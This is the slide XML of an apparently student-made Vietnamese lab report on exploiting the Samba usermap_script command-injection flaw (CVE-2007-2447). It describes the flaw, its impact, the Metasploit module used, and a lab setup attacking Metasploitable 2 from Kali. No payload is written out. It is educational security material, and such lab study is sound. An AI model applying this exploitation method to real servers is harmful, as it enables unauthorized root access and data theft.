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69" r:id="rId3"/>
    <p:sldId id="270" r:id="rId4"/>
    <p:sldId id="271" r:id="rId5"/>
    <p:sldId id="256" r:id="rId6"/>
    <p:sldId id="268" r:id="rId7"/>
    <p:sldId id="266" r:id="rId8"/>
    <p:sldId id="265" r:id="rId9"/>
    <p:sldId id="264" r:id="rId10"/>
    <p:sldId id="263" r:id="rId11"/>
    <p:sldId id="262" r:id="rId12"/>
    <p:sldId id="261" r:id="rId13"/>
    <p:sldId id="260" r:id="rId14"/>
    <p:sldId id="275" r:id="rId15"/>
    <p:sldId id="274" r:id="rId16"/>
    <p:sldId id="273" r:id="rId17"/>
    <p:sldId id="272" r:id="rId18"/>
    <p:sldId id="276" r:id="rId19"/>
    <p:sldId id="277" r:id="rId20"/>
    <p:sldId id="278" r:id="rId21"/>
    <p:sldId id="257" r:id="rId22"/>
    <p:sldId id="25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1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260301609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192293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4065594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912C02-2CE1-4723-BF90-77F793F9D86B}"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227271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912C02-2CE1-4723-BF90-77F793F9D86B}"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3375786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912C02-2CE1-4723-BF90-77F793F9D86B}"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471100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5912C02-2CE1-4723-BF90-77F793F9D86B}"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782409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912C02-2CE1-4723-BF90-77F793F9D86B}"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3316332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912C02-2CE1-4723-BF90-77F793F9D86B}"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709565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912C02-2CE1-4723-BF90-77F793F9D86B}"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2590572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3559455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194743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3261845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2222382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3656714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649016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912C02-2CE1-4723-BF90-77F793F9D86B}"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AFAD9C-313D-4EE0-93D4-3602F486C9DC}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3353766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5912C02-2CE1-4723-BF90-77F793F9D86B}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12/10/2025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2AFAD9C-313D-4EE0-93D4-3602F486C9DC}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2722716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apid7.com/db/modules/exploit/multi/samba/usermap_script/?utm_source=chatgpt.com" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.samba.org/samba/security/CVE-2007-2447.html?utm_source=chatgpt.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samba.org/samba/security/CVE-2007-2447.html?utm_source=chatgpt.com" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.tenable.com/plugins/nessus/82580?utm_source=chatgpt.com" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://medium.com/%40Rootxsunny/cve-2007-2447-exploitation-e62d6349b6fa?utm_source=chatgpt.com"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nvd.nist.gov/vuln/detail/CVE-2007-2447?utm_source=chatgpt.com" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.samba.org/samba/security/CVE-2007-2447.html?utm_source=chatgpt.com" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/?utm_source=chatgpt.com" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.kb.cert.org/vuls/id/268336?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4086757" y="803454"/>
            <a:ext cx="7197726" cy="2798333"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>BÁO CÁO THỰC HÀNH TẤN CÔNG SAMBA USERMAP_SCRIPT (CVE-2007-2447)</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3962399" y="4649079"/>
            <a:ext cx="7197726" cy="1405467"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>NGƯỜI THỰC HIỆN: NGUYỄN </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Thành</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Lâm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="370596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4174539" y="459641"/>
            <a:ext cx="7197726" cy="2327452"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Giới</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>thiệu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>về</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>lỗ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>hổng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>bảo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>mật</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> samba </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>usermap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> script (cve-2007-2447)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4569BB1E-5975-4B79-9E06-72AB01688467}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="131763" y="2938068"/>
            <a:ext cx="1189941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Tổng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quan</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lỗ</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hổng</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CVE-2007-2447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ảnh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hưởng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tới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Samba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phiên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bản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từ</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3.0.0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đến</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3.0.25rc3</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Samba+2SUSE+2</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Bản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chất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của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lỗ</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hổng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Samba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thông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thành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phần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smbd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MS-RPC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ví</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dụ</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SamrChangePassword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quản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share, in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ấn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từ</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đã</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lọc</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đúng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đầu</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input)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mà</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truyền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trực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tiếp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một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shell /bin/sh.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server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cấu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với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tùy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chọn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“username map script”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smb.conf</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kẻ</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tấn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công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thể</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ký</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tự</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shell (shell metacharacters)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tên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chèn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lệnh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tùy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ý.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Samba+2Rapid7+2</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Đáng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chú</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ý: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“username map script”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bật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phần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này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chạy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trước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người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dùng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nghĩa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là</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đăng</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nhập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vẫn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thể</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Rapid7+2CERT Coordination Center+2</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Ngoài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ngay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cả</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dùng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username map script,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chức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năng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RPC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quản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lý</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chia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sẻ</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máy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nếu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được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gọi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bởi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người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dùng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đã</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cũng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thể</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bị</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lợi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dụng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để</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lệnh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shell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tùy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ý.</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3181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4174539" y="459641"/>
            <a:ext cx="7197726" cy="2327452"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Giới</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>thiệu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>về</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>lỗ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>hổng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>bảo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>mật</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> samba </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>usermap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> script (cve-2007-2447)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4569BB1E-5975-4B79-9E06-72AB01688467}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="131763" y="3630568"/>
            <a:ext cx="1192505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none" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Mức</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" cap="none" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" cap="none" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>độ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" cap="none" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" cap="none" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ảnh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" cap="none" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" cap="none" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>hưởng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" cap="none" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" cap="none" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>và</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" cap="none" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" cap="none" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>rủi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" cap="none" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" cap="none" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ro</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" b="1" cap="none"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Về mức độ: lỗ hổng được đánh giá có mức độ “Medium” (với CVSS v2 là 6.0) theo các thông báo bảo mật thời đó</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Với việc “username map script” bật, kẻ tấn công từ xa, không cần xác thực, có thể thực thi lệnh tùy ý với quyền của tiến trình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smbd (thường là root hoặc nobody tùy cấu hình).</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Nếu server Samba chia sẻ file/máy in, hoặc dùng chức năng RPC quản lý từ mạng, lỗ hổng rất dễ bị khai thác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dẫn tới nguy cơ root shell, chiếm quyền điều khiển server, rò rỉ dữ liệu, cài backdoor, lan sang hệ thống nội bộ.</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6107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4174539" y="459641"/>
            <a:ext cx="7197726" cy="2327452"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Giới</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>thiệu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>về</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>lỗ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>hổng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>bảo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>mật</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> samba </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>usermap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> script (cve-2007-2447)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4569BB1E-5975-4B79-9E06-72AB01688467}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="131763" y="3769070"/>
            <a:ext cx="115659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Cách</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thác</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Có</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sẵn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trong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Metasploit Framework: module exploit/multi/samba/</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usermap_script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cấu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hình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đúng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(Samba 3.0.20–3.0.25rc3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và</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“username map script”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bật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cấp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remote shell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mà</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không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cần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xác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thực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Ngoài ra, có thể khai thác thủ công: bằng cách gửi RPC với tên người dùng chứa lệnh shell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 smbclient hoặc các script custom), nếu server xử lý “username map script”, sẽ thực thi lệnh đó.</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2966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268222" y="184100"/>
            <a:ext cx="11560456" cy="1542287"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0" err="1"/>
              <a:t>Tấn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0" err="1"/>
              <a:t>Công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0" err="1"/>
              <a:t>Lỗ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0" err="1"/>
              <a:t>Hổng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0"/>
              <a:t> Samba </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0" err="1"/>
              <a:t>usermap_script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0"/>
              <a:t> (CVE-2007-2447)</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195070" y="2154596"/>
            <a:ext cx="11787227" cy="4519304"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Giới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thiệu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>thiết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bị</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sử</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dụng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máy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ảo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>: kali </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>linux</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và</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metasploiable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> 2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Mạng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cho</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> 2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>máy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>: bridged adapter</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Thực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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900" algn="r">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Sử</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dụng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công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cụ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Metasploit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máy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> kali </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>linux</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tấn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công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cổng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> 139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cổng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> 445 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>của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máy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metasploiable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> 2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900" algn="r">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pP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hiện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kiểm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xem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chiếm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quyền</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> root </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>chưa</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
